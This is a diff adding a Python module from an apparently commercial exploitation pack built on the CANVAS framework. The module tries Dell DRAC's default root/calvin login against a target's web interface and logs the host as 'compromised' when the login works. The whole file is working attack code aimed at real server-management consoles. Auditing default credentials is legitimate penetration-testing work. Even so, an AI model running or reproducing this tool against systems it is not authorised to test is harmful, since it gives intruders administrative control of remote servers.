@@ -1,0 +1,111 @@
+#! /usr/bin/env python
+# -*- coding: utf-8 -*-
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2016
+#
+
+
+import sys, time, os
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from MOSDEF import mosdef
+from libs.spkproxy import header, body
+from libs.canvasos import *
+import canvasengine
+import urllib, urllib2
+
+# GUI info
+NAME = "d2sec_delldrac"
+DESCRIPTION = "DellDRAC Default Credentials Check Tools" 
+VERSION="1.0"
+
+DOCUMENTATION = {}
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION['References'] = ""
+DOCUMENTATION['Date public'] = ""
+DOCUMENTATION['Versions Affected'] = ""
+DOCUMENTATION["CVE Name"] = ""
+DOCUMENTATION["Notes"] = ""
+
+PROPERTY={}
+PROPERTY['TYPE'] = "Tools"
+PROPERTY['ARCH'] = [ ["All"] ]
+
+class theexploit (tcpexploit):
+
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.name = NAME
+    self.port = 443 
+
+  def check_default_creds(self):
+    url = "https://%s:%d/Applications/dellUI/RPC/WEBSES/create.asp" % (self.host, self.port)
+    opts = {
+      "WEBVAR_PASSWORD": "calvin",
+      "WEBVAR_USERNAME": "root",
+      "WEBVAR_ISCMCLOGIN": 0
+    }
+    data = urllib.urlencode(opts)
+    headers = {
+      "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:14.0) Gecko/20100101 Firefox/14.0.1",
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "Accept-Language": "en-us,en;q=0.5",
+      "Accept-Encoding": "gzip, deflate",
+      "Connection": "keep-alive",
+      "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+      "Referer": "https://%s:%d/Applications/dellUI/login.htm" % (self.host, self.port),
+      "Content-Length": 63,
+      "Cookie": "test=1; SessionLang=EN",
+      "Pragma": "no-cache",
+      "Cache-Control": "no-cache"
+    }
+    req = urllib2.Request(url, data, headers)
+    try:
+      response = urllib2.urlopen(req, timeout=2)
+      data = response.read()
+      if "Failure_Login_IPMI_Then_LDAP" in data:
+        self.log("[D2] Failure Login")
+        return 0
+      if "Failure_No_Free_Slot" in data:
+        self.log("[D2] There are to many people logged but un: root and pw: calvin are legit on IP: %s" % self.host)
+      if "'USERNAME' : 'root'" in data:
+        self.log("[D2] Dell DRAC compromised! username: root and password: calvin for IP address: %s" % self.host)
+    except:
+      return 0
+    return 1
+
+  def getargs(self):
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port))
+    return 0
+
+  def run(self):
+    self.getargs()
+    self.setInfo("%s attacking %s:%d" % (NAME, self.host, self.port))
+    self.log("%s attacking %s:%d" % (NAME, self.host, self.port))
+    if not self.check_default_creds():
+      self.setInfo("%s attacking %s:%d - failed" % (NAME, self.host, self.port))
+      return 0
+    self.setInfo("%s attacking %s:%d - done" % (NAME, self.host, self.port))
+    self.log("%s attacking %s:%d - done" % (NAME, self.host, self.port))
+    return 1
+
+  def usage(self):
+    print "Usage: %s -t target [-p port:443]" % sys.argv[0]
+    sys.exit(0)
+
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME,VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
+
